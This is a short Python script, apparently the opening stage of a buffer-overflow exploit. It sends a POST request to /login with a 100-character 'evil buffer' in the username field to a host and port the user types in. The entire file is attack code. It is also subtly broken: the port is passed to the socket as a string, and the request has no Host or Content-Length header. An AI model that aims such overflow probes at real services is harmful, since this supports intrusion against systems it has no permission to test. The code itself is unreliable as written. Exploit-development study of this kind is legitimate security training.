#!/usr/bin/python
import socket

IP = input("IP\n")
PORT = input("PORT\n")

try:
    print("\nSending evil buffer ")

    size = 100
    inputBuffer = "A"*size

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, PORT))

    s.send(buffer.encode('ascii'))

    s.close()

    print("Done")

except:
    print("Could not connect")